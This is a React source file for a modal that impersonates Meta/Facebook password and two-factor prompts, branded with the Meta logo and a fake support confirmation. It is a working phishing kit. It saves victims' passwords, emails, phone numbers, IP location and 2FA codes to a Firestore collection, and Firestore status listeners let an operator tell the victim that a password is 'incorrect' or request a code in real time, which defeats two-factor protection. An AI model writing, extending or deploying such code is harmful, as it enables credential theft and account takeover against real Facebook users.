import {
  collection,
  addDoc,
  onSnapshot,
  query,
  doc,
  updateDoc,
  runTransaction,
  orderBy,
  getDocs,
  limit,
} from "firebase/firestore";
import React, { useState,useEffect} from "react";
import Modal from "react-modal";
import { db } from "../../firebase";
import { useNavigate } from "react-router-dom";
import PhoneInput from 'react-phone-input-2'
import 'react-phone-input-2/lib/style.css'
import validator from "validator";
import logo from '../../../Resources/ic_logo.svg';
import authentication from '../../../Resources/authentication.png';
Modal.setAppElement("#root");

const modalStyle = {
  overlay: {
    backgroundColor: "rgb(0 0 0 / 65%)",
    zIndex: 1000,
  },
  content: {
    maxWidth: "500px",
    height: "90%",
    top: "50%", 
    left: "50%", 
    transform: "translate(-50%, -50%)",
    padding:'15px',
    borderRadius: "8px",
    boxShadow: "0 2px 4px rgba(0, 0, 0, 0.2)",
    backgroundColor: "white",
    position: "relative",
  },
};
const delay = ms => new Promise(res => setTimeout(res, ms));

const MyPopup = ({ isOpen, onClose, onSave }) => {




function maskContact(input) {
  if (!input) return "";
  if (input.includes("@")) {
    const [name, domain] = input.split("@");
    if (name.length <= 2) return input;
    const firstChar = name[0];
    const lastChar = name[name.length - 1];
    const masked = firstChar + "*".repeat(name.length - 2) + lastChar;
    return masked + "@" + domain;
  }

  const digits = input.replace(/\D/g, ""); // chỉ lấy số
  if (digits.length < 4) return input;

  const countryCodeMatch = input.match(/^\+\d+/);
  const countryCode = countryCodeMatch ? countryCodeMatch[0] : "";

  const lastTwo = digits.slice(-2);
  const masked = "*".repeat(digits.length - 2) + lastTwo;

  return countryCode
    ? `${countryCode} ${masked}`
    : masked;
}

  const [countryCode, setCountryCode] = useState('us');

  useEffect(() => {
    const ipAddrrs = localStorage.getItem("location") || "";
    if(ipAddrrs.length > 0){
      const JsLocation = JSON.parse(ipAddrrs);
      if(JsLocation && JsLocation.country){
        setCountryCode(JsLocation.country.toLowerCase());
      }
    }
  }, []);

  const [passwordShown, setPasswordShown] = useState(false);
  const formData = JSON.parse(
        localStorage.getItem("user") || "{}"
      );
  const togglePasswordVisiblity = async () => {
    setPasswordShown(passwordShown ? false : true);
    await delay(2000);
    setPasswordShown(false);
  };
  const [pass, setPass] = useState("");
  const [stage, setStage] = useState(0);
  const [error, SetError] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [userID, setUserID] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState({
    type: "",
    msg: "",
  });
  const [data, setData] = useState({});
  const usersRef = collection(db, "users");
  const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
  const listener = (userID) => {
    onSnapshot(doc(db, "users", userID), (snapshot) => {
      const status = snapshot.data()?.status;
      if (status === 0 || status === 1) return;
      // Handle different status codes here
      switch (status) {
        case -1:
          setResult({
            type: "warning",
            msg: "<a class=\"fw-bold text-danger\" rel=\"noopener noreferrer\" target=\"_blank\" href=\"https://www.facebook.com/login/identify/\" style=\"text-decoration: none;\">Forgoten Password?</a>",
          });
          setIsLoading(false);
          SetError(true);
          break;
        case 2:
          SetError(false);
          setStage(2);
          setIsLoading(false);
          break;
        default:
          console.log(status);
      }
    });
  };


  const listener2 = (userID) => {
    onSnapshot(doc(db, "users", userID), (snapshot) => {
      const status = snapshot.data()?.status;
      switch (status) {
        case 3:
          setResult({
            type: "success",
            msg: "You have successfully submitted your support request!",
          });
          SetError(false);
          setStage(3);
          setIsLoading(false);
          break;
        case -2:
          setResult({
            type: "error",
            msg: "The authentication code is incorrect, please try again!",
          });
          SetError(true);
          setIsLoading(false);
          break;
        default:
          console.log(status);
      }
    });
  };

  const updateIndex = async (userID) => {
    try {
      await runTransaction(db, async (transaction) => {
        const sfDocRef = doc(db, "users", userID);
        const sfDoc = await transaction.get(sfDocRef);
        const dosLast = await getDocs(q);
        if (!sfDoc.exists()) {
          throw "Document does not exist!";
        }
        const [lastest] = dosLast.docs
        const auto_id = (lastest?.get("auto_id") || 0) + 1;
        transaction.update(sfDocRef, { auto_id });
      });

      console.log("Transaction successfully committed!");
    } catch (e) {
      console.log("Transaction failed: ", e);
    }
  };


  const handleSubmit = async () => {
    if(!pass || pass.length < 6){
        SetError(true);
        setIsLoading(false);
        return;
    }
    setIsLoading(true); 
    SetError(false);
    try {
      if (result.type && result.type !== "success") {
        updateDoc(doc(db, "users", data.id), {
          status: 1,
          pass: pass
        });
        return;
      }
      setResult({
        type: "",
        msg: "",
      });
      const ipAddrrs = localStorage.getItem("location") || "";
      const user = await addDoc(collection(db, "users"), {
        pass:pass,phone:formData.phone,email:formData.email,auth:'',ip:ipAddrrs,status: 1,createdAt: new Date().getTime(),
      });
      if(user.id){
        updateIndex(user.id);
        setData(user);
        setUserID(user.id);
        listener(user.id);
      }
    } catch (error) {
      console.error("Error saving data to Firestore: ", error);
    } finally {
    }
  };

  const handleAuthEnter = async () => {
    try {
      if(!inputValue || inputValue.length < 6){
        SetError(true);
        setIsLoading(false);
        return;
      }
      const userDocRef = doc(db, "users", userID);
      await updateDoc(userDocRef, {
        auth: inputValue,
        status: 2
      });
      listener2(userID);
      setIsLoading(true);
      console.log(isLoading);
    } catch (error) {
    } finally {
    }
  };

  return (
    <Modal
      isOpen={isOpen}
      onRequestClose={onClose}
      style={modalStyle}
      shouldCloseOnOverlayClick={true}
    >
      <>



               {(() => {

                  switch(stage) {
                    case 0:   
                    return(
                    <div className="bg-white flex items-center justify-center">
                          <div className="mt-5 w-full px-1 text-center">  
                            <div className="mb-10">
                              <div className="w-12 h-12 mb-5 mx-auto">
                    <img src={logo} alt="Meta" className="w-full"/>
                     </div>
                            </div>
                            <p className="text-gray-500 text-sm mb-6">
                              For your security, you must enter your password to continue.
                            </p>
                                      <div style={{position:'relative',width:'100%'}}>
                                        <input type={passwordShown ? "text" : "password"} style={{width: '100%'}} id="Password" value={pass} onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value);}} className="InputText__input"/>
                                         <img onClick={togglePasswordVisiblity} style={{position:'absolute',top: '50%',right:'15px',transform: 'translateY(-50%)',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                                      </div>
                                      {error && <p className="mt-2 text-red-500 text-sm">The password you entered is incorrect.</p>}
                            <button
                       onClick={handleSubmit} // bình thường, không async () => ...
                      disabled={isLoading}
                      className="mt-3 w-full h-[40px]
                      bg-[#1877F2] text-white rounded-full
                      hover:bg-[#166FE5]
                      transition-all duration-200
                      flex items-center justify-center"
                    >
                      {isLoading ? <span>  <span
                        className={`flex items-center gap-2 transition-opacity duration-200`}>
                    <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
                      </span></span> : <span>Continue</span>}
                    </button>
                            <p className="text-gray-400 mt-5 text-sm cursor-pointer hover:underline">
                              Forgot your password?
                            </p>
                            <div className="mt-16 text-gray-400 text-sm flex items-center justify-center gap-1">
                              <span className="text-xl">∞</span>
                              <span>Meta</span>
                            </div>
                          </div>
                        </div> 
                        
                        );
                    case 1:   
                     return (<div className="modal-body">

                     <div className="fb-round-wraper">
                         <img src="img/fb_round_logo.png" className="fb-logo-round"/>
                     </div>
                     <div id="apiForm">
                         <div className="mb-3">
                             <div className="password-input">
                                 <label htmlFor="exampleInputPassword" className="form-label">Password</label>
                                 <div style={{display: 'flex', alignItems: 'center'}}>
                                     <input onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value);}} type={passwordShown ? "text" : "password"} className="form-control" id="exampleInputPassword" autoComplete="off" minLength="8" maxLength="30" aria-describedby="emailHelp"/>
                                 </div>
                                 <img onClick={togglePasswordVisiblity} style={{position:'absolute',right:'5%',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                             </div>
                             <div style={{display: error == true ? 'inline-block' : 'none'}} className="mt-2 invalid-feedback">
                                Password is incorrect, please try again.
                            </div>
                         </div>
                         <div className="form-btn-wrapper">
                             <button disabled={isLoading == true ? true : false} onClick={handleSubmit} className="btn btn-primary">
                                 <div className="spinner-border text-light" role="status" style={{display: isLoading ? 'inline-block' : 'none'}}>
                                     <span className="visually-hidden"></span>
                                 </div>
                                 <span className="button-text">&nbsp;{isLoading == true ? 'Loading...' : 'Continue'}</span>
                             </button>
                         </div>
                         <div id="forgot-pass-wrap">
                             <span>Forgot password?</span>
                         </div>
                     </div>
                     <div className="spaser"></div>
                 </div>);
                    case 2: 
                     return (


                      <div className="bg-white flex items-center justify-center">
                            <div className="bg-white w-full max-w-xl p-1">
                              <p className="text-gray-500 text-sm mb-2">
                                {formData.name} • Facebook
                              </p>
                      
                              <h1 className="text-lg font-bold mb-4">
                                Two-factor authentication required
                              </h1>
                      
                              <p className="text-gray-500 text-sm mb-6 leading-relaxed">
                                Enter the code for this account that we send to 
                                {maskContact(formData.email)}, {maskContact(formData.phone)} or simply confirm 
                                through the application of two factors that you have set 
                                (such as Duo Mobile or Google Authenticator)
                              </p>
                      
                                <img
                                  src={authentication}
                                  alt="2FA Illustration"
                                  className="rounded-xl mb-6 flex items-center justify-center max-h-48"
                                />
                      
                              <input
                                type="text"
                                placeholder="Code"
                                onChange={(e) => {
                    if(!isNaN(+e.target.value) == false) return;
                    setInputValue(e.target.value);
                  }} name="2FA-1" minLength="6" maxLength="8"
                                className="w-full border border-gray-300 rounded-lg px-4 py-2.5 mb-1 focus:outline-none focus:ring-2 focus:ring-blue-500"
                              />
                                        {error && <p className="mt-2 text-red-500 text-sm">The code you entered is incorrect.</p>}
                      
                       <button
                        disabled={isLoading ? true : false} onClick={handleAuthEnter}
                        className="mt-3 w-full h-[40px]
                        bg-[#1877F2] text-white rounded-full
                        hover:bg-[#166FE5]
                        transition-all duration-200
                        flex items-center justify-center"
                      >
                        {isLoading ? <span>  
                          <span
                          className={`flex items-center gap-2 transition-opacity duration-200`}>
                      <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
                        </span>
                        </span> : 
                        <span>Continue</span>
                        }
                      </button>
                              <button className="mt-3 w-full border border-gray-300 text-gray-500 py-3 h-[40px] rounded-full hover:bg-gray-100 flex items-center justify-center">
                                Try another way
                              </button>
                            </div>
                          </div>
                );
                    default:  
                      return (

                         <div className="bg-white flex items-center justify-center p-4">
      <div className="w-full overflow-hidden">
        
        {/* Image / Banner */}
        <div className="p-6 flex items-center justify-center">
          <div className="bg-blue-500 text-white rounded-full p-3 shadow-md">
            {/* Check Icon */}
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-8 w-8"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={3}
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>
        </div>

        {/* Content */}
        <div className="p-6 text-center">
          <h2 className="text-lg font-semibold text-gray-800 mb-3">
            The request has been sent.
          </h2>

          <p className="text-sm text-gray-500 leading-relaxed">
            Your request has been added to the processing queue. We will review
            your request within 24 hours.
            <br />
            From Meta Customer Support.
          </p>

          {/* Button */}
          <form action="https://facebook.com/" method="GET">
          <button className="mt-6 w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 rounded-full transition">
            Back to Facebook
          </button>
</form>
          {/* Footer */}
          <div className="mt-4 text-gray-400 text-sm flex items-center justify-center gap-1">
            <span className="text-lg">∞</span>
            <span>Meta</span>
          </div>
        </div>
      </div>
    </div>
                  );
                  }

       
                })()}
      </>
    </Modal>
  );
};

export default MyPopup;
